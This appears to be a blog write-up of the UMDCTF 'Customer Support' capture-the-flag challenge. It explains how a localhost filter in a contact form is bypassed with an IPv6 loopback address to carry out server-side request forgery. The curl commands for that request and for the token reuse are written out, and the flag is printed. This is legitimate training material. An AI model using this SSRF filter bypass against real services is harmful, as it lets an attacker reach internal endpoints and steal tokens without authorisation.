---
title: "UMDCTF: Customer Support"
date: 2022-03-06T19:09:57-05:00
image: /UMDCTF/UMDCTF.png
tags:
    - UMDCTF
---



![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306144115.png)

For this challenge we were given 
![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306144230.png)
So I stared out by opening the Dockerfile 
![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306144325.png)
In the docker file we can see the starting command is ```npm run startall```
![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306144449.png)
Looking at the package.json we can see two service being started with start all script.

![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306144621.png)
In app.js inside microservice we can see two path that returns token.
![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306144728.png)
This microservice is running in port 3001. The first thing that I tried to do was open that port, but i couldn't access it. 
*Time for more code analysis*
![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306145052.png)
Here I can see that there's some request being sent, and it's using our input to send the request.
![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306145540.png)
There is a filter that checks for any 'localhost', '127.0.0.1' or '0.0.0.0' in the message body. All we need to do now is figure out a way to access localhost using something that's not filtered. In this case we can use `::1/28`, so if we try to access `http://::1/28/auth` 
```bash
curl -X POST https://customer-support-p558t.ondigitalocean.app/api/contact -H 'Content-Type: application/json' -d '{"name":"ts","email":"test@test.com","subject":"test","message":"http://::1/28/auth"}'
```

![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306150537.png)
This will return a token. 

What can we do with the token?
![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306150617.png)
there's an api that will take the token and return the flag.
We need to pass the token in cookie Authorization. 

```bash
curl --cookie 'Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlVNRENURiIsImIiOiJUb2RheSBJIHdpbGwgbGl2ZSBpbiB0aGUgbW9tZW50LCB1bmxlc3MgaXQgaXMgdW5wbGVhc2FudCwgaW4gd2hpY2ggY2FzZSwgSSB3aWxsIGVhdCIsImlhdCI6MTcxNjIzOTAyMn0.7SoLIpd9dL9d3Lx84vbAqlLCE5rR3fWqN8ZWLx41QDE' https://customer-support-p558t.ondigitalocean.app/api/auth
```
![](/UMDCTF/CustomerSupport/Pasted%20image%2020220306151214.png)
This gives me the flag

```
UMDCTF{I_b3t_th@t_c00kie_t4sted_g00d_d!dnt_it!U4L_p4rs1ng_suck5}
```
